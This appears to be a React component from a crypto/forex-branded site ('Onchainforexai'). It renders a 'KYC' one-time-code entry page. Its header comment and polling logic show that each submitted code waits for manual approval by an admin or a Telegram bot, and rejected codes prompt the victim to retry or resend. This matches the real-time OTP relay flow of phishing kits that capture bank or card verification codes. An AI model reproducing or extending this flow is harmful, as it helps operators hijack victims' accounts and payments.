import { useEffect, useRef, useState } from 'react'
import api from '../../../../utils/axios'
import ThemeToggle from '../../../../components/ThemeToggle'
import { useSiteSettings } from '../../../../context/SiteSettingsContext'
import { getImageUrl } from '../../../../utils/imageUrl.js'

const LENGTH = 6

/**
 * Full-page KYC OTP — same pattern as buy OTP:
 * entry → submit → wait for admin/Telegram → approved (complete) or rejected (retry)
 */
export default function StepKycOtp({
  sentTo,
  expiresInSec = 900,
  loading,
  error,
  onVerify,
  onResend,
  onBack,
  onCompleted,
  onRejected,
  statusPath = '/api/kyc/otp/status'
}) {
  const { settings: siteSettings } = useSiteSettings()
  const siteName = siteSettings?.site?.name || 'Onchainforexai'
  const [digits, setDigits] = useState(Array(LENGTH).fill(''))
  const [seconds, setSeconds] = useState(expiresInSec)
  const [phase, setPhase] = useState('entry') // entry | waiting
  const [localError, setLocalError] = useState(error || '')
  const [resending, setResending] = useState(false)
  const [lastSubmitted, setLastSubmitted] = useState('')
  const [displaySentTo, setDisplaySentTo] = useState(sentTo || 'your phone')
  const inputs = useRef([])

  useEffect(() => {
    if (error) setLocalError(error)
  }, [error])

  useEffect(() => {
    setDisplaySentTo(sentTo || 'your phone')
  }, [sentTo])

  useEffect(() => {
    if (phase === 'entry') {
      setDigits(Array(LENGTH).fill(''))
      setTimeout(() => inputs.current[0]?.focus(), 50)
    }
  }, [phase])

  useEffect(() => {
    if (seconds <= 0 || phase !== 'entry') return undefined
    const t = setInterval(() => setSeconds((s) => Math.max(0, s - 1)), 1000)
    return () => clearInterval(t)
  }, [seconds, phase])

  // Poll while waiting for admin / telegram
  useEffect(() => {
    if (phase !== 'waiting') return undefined
    let cancelled = false

    const tick = async () => {
      try {
        const { data } = await api.get(statusPath)
        if (cancelled || !data?.success) return

        if (data.completed || data.otpVerified) {
          setPhase('entry')
          onCompleted?.(data)
          return
        }

        if (data.otpRejected) {
          setPhase('entry')
          setLocalError('Incorrect code. Please try again.')
          setDigits(Array(LENGTH).fill(''))
          onRejected?.(data)
          return
        }

        if (data.waitingForAdmin) {
          setPhase('waiting')
        }
      } catch {
        /* ignore poll errors */
      }
    }

    tick()
    const t = setInterval(tick, 2500)
    return () => {
      cancelled = true
      clearInterval(t)
    }
  }, [phase, statusPath, onCompleted, onRejected])

  const code = digits.join('')
  const mins = Math.floor(seconds / 60)
  const secs = String(seconds % 60).padStart(2, '0')

  const setDigit = (index, value) => {
    const v = value.replace(/\D/g, '').slice(-1)
    const next = [...digits]
    next[index] = v
    setDigits(next)
    if (localError) setLocalError('')
    if (v && index < LENGTH - 1) inputs.current[index + 1]?.focus()
  }

  const onKeyDown = (index, e) => {
    if (e.key === 'Backspace' && !digits[index] && index > 0) {
      inputs.current[index - 1]?.focus()
    }
    if (e.key === 'Enter' && code.length === LENGTH) {
      submit()
    }
  }

  const onPaste = (e) => {
    e.preventDefault()
    const text = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, LENGTH)
    if (!text) return
    const next = Array(LENGTH).fill('')
    text.split('').forEach((c, i) => {
      next[i] = c
    })
    setDigits(next)
    setLocalError('')
    inputs.current[Math.min(text.length, LENGTH - 1)]?.focus()
  }

  const submit = async () => {
    if (code.length !== LENGTH || loading) return
    setLocalError('')
    setLastSubmitted(code)
    const ok = await onVerify?.(code)
    if (ok !== false) {
      setPhase('waiting')
    } else {
      // Stay on entry — parent may have auto-resent a new code
      setPhase('entry')
      setDigits(Array(LENGTH).fill(''))
      setTimeout(() => inputs.current[0]?.focus(), 50)
    }
  }

  const handleResend = async () => {
    if (resending || loading) return
    setResending(true)
    setLocalError('')
    try {
      const result = await onResend?.()
      if (result === false || result == null) return
      setSeconds(result?.otpExpiresInSec || expiresInSec)
      if (result?.otpSentTo) setDisplaySentTo(result.otpSentTo)
      setDigits(Array(LENGTH).fill(''))
      setPhase('entry')
      setTimeout(() => inputs.current[0]?.focus(), 50)
    } finally {
      setResending(false)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-50 via-teal-50/25 to-slate-100 dark:from-slate-950 dark:via-slate-950 dark:to-slate-900 flex flex-col">
      <header className="sticky top-0 z-40 border-b border-slate-200/80 dark:border-slate-800 bg-white/90 dark:bg-slate-950/90 backdrop-blur-xl">
        <div className="max-w-lg mx-auto px-4 sm:px-5 py-3 flex items-center justify-between gap-3">
          <div className="flex items-center gap-2 min-w-0">
            {onBack && phase === 'entry' ? (
              <button
                type="button"
                onClick={onBack}
                className="p-2 -ml-1 rounded-xl text-slate-500 hover:text-slate-900 dark:hover:text-white hover:bg-slate-100 dark:hover:bg-slate-800"
                aria-label="Back"
              >
                <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 19l-7-7 7-7" />
                </svg>
              </button>
            ) : null}
            {siteSettings?.site?.logo ? (
              <img
                src={getImageUrl(siteSettings.site.logo)}
                alt=""
                className="w-8 h-8 rounded-lg object-contain"
              />
            ) : (
              <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-teal-500 to-cyan-600 flex items-center justify-center text-white text-sm font-bold">
                {siteName.charAt(0)}
              </div>
            )}
            <span className="text-sm font-semibold truncate">{siteName}</span>
          </div>
          <ThemeToggle />
        </div>
      </header>

      <main className="flex-1 flex flex-col items-center justify-center px-4 py-8 sm:py-12">
        <div className="w-full max-w-md">
          {phase === 'waiting' ? (
            <div className="rounded-3xl border border-slate-200 dark:border-slate-700 bg-white dark:bg-slate-900 shadow-xl p-8 text-center">
              <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-teal-500 mx-auto mb-4" />
              <h1 className="text-xl font-bold text-slate-900 dark:text-white mb-2">Verifying your code</h1>
              <p className="text-sm text-slate-500">
                We are reviewing your code. This page updates automatically.
              </p>
              {lastSubmitted ? (
                <p className="mt-3 text-sm text-slate-600 dark:text-slate-300">
                  You submitted:{' '}
                  <span className="font-mono font-bold tracking-widest">{lastSubmitted}</span>
                </p>
              ) : null}
            </div>
          ) : (
            <>
              <div className="text-center mb-8">
                <div className="w-14 h-14 mx-auto mb-4 rounded-2xl bg-gradient-to-br from-teal-500 to-cyan-600 flex items-center justify-center shadow-lg shadow-teal-500/25">
                  <svg className="w-7 h-7 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={2}
                      d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                    />
                  </svg>
                </div>
                <h1 className="text-2xl font-bold text-slate-900 dark:text-white tracking-tight">
                  Enter verification code
                </h1>
                <p className="mt-2 text-sm text-slate-500 dark:text-slate-400">We sent a 6-digit code to</p>
                <p className="mt-1 text-base font-semibold text-slate-800 dark:text-slate-100 font-mono tracking-wide">
                  {displaySentTo}
                </p>
              </div>

              <div className="rounded-3xl border border-slate-200 dark:border-slate-700 bg-white dark:bg-slate-900 shadow-xl p-6 sm:p-8">
                <div className="flex justify-center gap-2 sm:gap-2.5 mb-6" onPaste={onPaste}>
                  {digits.map((d, i) => (
                    <input
                      key={i}
                      ref={(el) => {
                        inputs.current[i] = el
                      }}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={d}
                      onChange={(e) => setDigit(i, e.target.value)}
                      onKeyDown={(e) => onKeyDown(i, e)}
                      className="w-11 sm:w-12 text-center text-xl font-mono font-bold rounded-xl border border-slate-200 dark:border-slate-600 bg-slate-50 dark:bg-slate-800 text-slate-900 dark:text-white focus:border-teal-500 focus:ring-2 focus:ring-teal-500/20 outline-none transition"
                      style={{ height: '3.25rem' }}
                      aria-label={`Digit ${i + 1}`}
                    />
                  ))}
                </div>

                {localError ? (
                  <p className="text-center text-sm text-red-600 mb-4" role="alert">
                    {localError}
                  </p>
                ) : null}

                <p className="text-center text-xs text-slate-500 mb-5 tabular-nums">
                  Code expires in {mins}:{secs}
                </p>

                <button
                  type="button"
                  disabled={code.length !== LENGTH || loading}
                  onClick={submit}
                  className="w-full min-h-[48px] rounded-xl font-semibold text-white bg-gradient-to-r from-teal-500 to-cyan-600 hover:from-teal-600 hover:to-cyan-700 shadow-lg shadow-teal-500/20 disabled:opacity-50 disabled:shadow-none transition"
                >
                  {loading ? 'Submitting…' : 'Verify code'}
                </button>

                <button
                  type="button"
                  disabled={loading || resending}
                  onClick={handleResend}
                  className="w-full mt-3 min-h-[44px] text-sm font-semibold text-teal-600 dark:text-teal-400 hover:underline disabled:opacity-50"
                >
                  {resending ? 'Sending…' : 'Resend code'}
                </button>
              </div>
            </>
          )}
        </div>
      </main>
    </div>
  )
}
